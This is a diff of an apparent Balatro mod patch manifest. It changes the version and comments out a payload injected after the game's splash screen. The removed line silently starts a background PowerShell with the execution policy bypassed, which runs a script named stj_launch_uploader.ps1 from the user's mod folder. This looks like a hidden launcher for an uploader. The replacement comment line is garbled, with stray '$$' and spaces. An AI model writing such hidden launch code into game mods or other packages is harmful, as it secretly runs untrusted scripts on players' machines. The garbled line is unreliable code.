@@ -1,5 +1,5 @@
 [manifest]
-version = "0.2"
+version = "0.1.3a"
 dump_lua = true
 priority = 0
 
@@ -75,8 +75,9 @@ pattern = '''self:splash_screen()
 '''
 position = "after"
 payload = '''
-os.execute('start /b powershell -ExecutionPolicy Bypass -Command "& { $d=Get-ChildItem \\"$env:APPDATA\\Balatro\\Mods\\" -Directory | Where-Object { $_.Name -match \\"^Slay[-]?The[-]?Jokers\\" } | Select-Object -First 1; if ($d) { & \\"$($d.FullName)\\\\stj_launch_uploader.ps1\\" } }"')
+-- os.execute('start /b powershell -ExecutionPolicy Bypass -Command "& { $d=Get-ChildItem \\"$env:APPDATA\\Balatro\\Mods\\" -Directory | Where-Object { $_.Name -match \\"^Slay[-]?The[-]?Jokers\\" } | Select-Object -First 1; if ($$   d) { & \\"   $$($d.FullName)\\\\stj_launch_uploader.ps1\\" } }"')
 '''
+
 match_indent = true
 
 [[patches]]
